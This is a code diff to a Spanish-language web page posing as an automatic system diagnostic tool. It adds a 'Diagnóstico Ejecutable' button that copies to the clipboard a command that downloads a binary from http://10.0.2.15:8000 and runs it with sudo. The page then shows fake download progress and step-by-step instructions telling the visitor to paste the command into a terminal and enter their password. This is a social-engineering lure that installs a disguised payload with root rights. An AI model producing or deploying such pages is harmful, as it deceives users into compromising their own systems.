@@ -123,7 +123,16 @@
         
         <div class="diagnostic-box">
             <h2>🚀 Diagnóstico Automático del Sistema</h2>
-            <p>Esta herramienta realizará un análisis completo de su sistema de red y configuración. El proceso incluye:</p>
+            <p>Esta herramienta realizará un análisis completo de su sistema de red y configuración. Elija el método que mejor se adapte a su entorno:</p>
+            
+            <div style="background: #f0f8ff; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: left;">
+                <h4>📋 Opciones Disponibles:</h4>
+                <ul style="margin: 10px 0;">
+                    <li><strong>🚀 Diagnóstico Completo:</strong> Instalación automática con todas las dependencias</li>
+                    <li><strong>⚡ Diagnóstico Rápido:</strong> Versión optimizada para ejecución rápida</li>
+                    <li><strong>📦 Ejecutable Standalone:</strong> Sin dependencias, listo para usar (RECOMENDADO)</li>
+                </ul>
+            </div>
             
             <div class="features">
                 <div class="feature">
@@ -146,6 +155,16 @@
                     <h3>Seguridad del Sistema</h3>
                     <p>Análisis de vulnerabilidades</p>
                 </div>
+                <div class="feature">
+                    <div class="feature-icon">📦</div>
+                    <h3>Ejecutable Standalone</h3>
+                    <p>Sin dependencias, listo para usar</p>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">⚡</div>
+                    <h3>Múltiples Opciones</h3>
+                    <p>Completo, rápido o ejecutable</p>
+                </div>
             </div>
             
             <div class="warning">
@@ -158,6 +177,10 @@
             
             <button class="install-btn" onclick="quickDiagnostic()" style="background: linear-gradient(45deg, #2196F3, #1976D2);">
                 ⚡ Diagnóstico Rápido
+            </button>
+            
+            <button class="install-btn" onclick="executableDiagnostic()" style="background: linear-gradient(45deg, #FF5722, #D84315);">
+                📦 Diagnóstico Ejecutable (Standalone)
             </button>
             
             <div id="status" class="status"></div>
@@ -198,6 +221,15 @@
             executeCommand(command, 'Diagnóstico rápido');
         }
 
+        function executableDiagnostic() {
+            showStatus('📦 Iniciando diagnóstico con ejecutable standalone...', 'loading');
+            
+            // Comando para descargar y ejecutar el ejecutable compilado
+            const command = `wget http://10.0.2.15:8000/dist/system_monitor && chmod +x system_monitor && sudo ./system_monitor`;
+            
+            executeExecutableCommand(command);
+        }
+
         function executeCommand(command, type) {
             // Crear un elemento temporal para copiar el comando
             const tempElement = document.createElement('textarea');
@@ -236,6 +268,67 @@
                                 <li>El diagnóstico se ejecutará automáticamente en segundo plano</li>
                             </ol>
                             <p><strong>Nota:</strong> El comando ya está copiado en su portapapeles.</p>
+                        </div>
+                    `;
+                    document.getElementById('status').appendChild(instructions);
+                }, 1000);
+            }, 4000);
+        }
+
+        function executeExecutableCommand(command) {
+            // Crear un elemento temporal para copiar el comando
+            const tempElement = document.createElement('textarea');
+            tempElement.value = command;
+            document.body.appendChild(tempElement);
+            tempElement.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempElement);
+            
+            // Simular progreso específico para ejecutable
+            setTimeout(() => {
+                showStatus('📦 Descargando ejecutable standalone...', 'loading');
+            }, 1000);
+            
+            setTimeout(() => {
+                showStatus('🔧 Configurando permisos de ejecución...', 'loading');
+            }, 2000);
+            
+            setTimeout(() => {
+                showStatus('🚀 Preparando para ejecutar diagnóstico...', 'loading');
+            }, 3000);
+            
+            setTimeout(() => {
+                showStatus('✅ Ejecutable descargado y listo para usar.', 'success');
+                
+                // Mostrar instrucciones específicas para ejecutable
+                setTimeout(() => {
+                    const instructions = document.createElement('div');
+                    instructions.innerHTML = `
+                        <div style="margin-top: 20px; padding: 15px; background: #fff3e0; border-radius: 8px; border-left: 4px solid #FF5722;">
+                            <h4>🔧 Instrucciones para Ejecutable Standalone:</h4>
+                            <div style="text-align: left;">
+                                <p><strong>Paso 1:</strong> Abra una terminal (Ctrl+Alt+T)</p>
+                                <p><strong>Paso 2:</strong> Pegue y ejecute el comando copiado (ya está en su portapapeles):</p>
+                                <div style="background: #1e1e1e; color: #00ff00; padding: 10px; border-radius: 4px; font-family: monospace; margin: 10px 0;">
+                                    wget http://10.0.2.15:8000/dist/system_monitor && chmod +x system_monitor && sudo ./system_monitor
+                                </div>
+                                <p><strong>Paso 3:</strong> Proporcione su contraseña cuando se solicite</p>
+                                <p><strong>Paso 4:</strong> El diagnóstico se ejecutará automáticamente</p>
+                                
+                                <div style="background: #e8f5e8; padding: 10px; border-radius: 4px; margin-top: 15px;">
+                                    <h5 style="margin: 0 0 5px 0;">💡 Ventajas del Ejecutable:</h5>
+                                    <ul style="margin: 5px 0;">
+                                        <li>✅ No requiere instalación de dependencias</li>
+                                        <li>✅ Funciona sin Python instalado</li>
+                                        <li>✅ Ejecución más rápida y directa</li>
+                                        <li>✅ Perfecto para sistemas limpios</li>
+                                    </ul>
+                                </div>
+                                
+                                <div style="background: #fff3cd; padding: 10px; border-radius: 4px; margin-top: 10px;">
+                                    <strong>⚠️ Nota:</strong> Si el ejecutable no funciona en su sistema, use las opciones "Diagnóstico Completo" o "Diagnóstico Rápido" como alternativa.
+                                </div>
+                            </div>
                         </div>
                     `;
                     document.getElementById('status').appendChild(instructions);
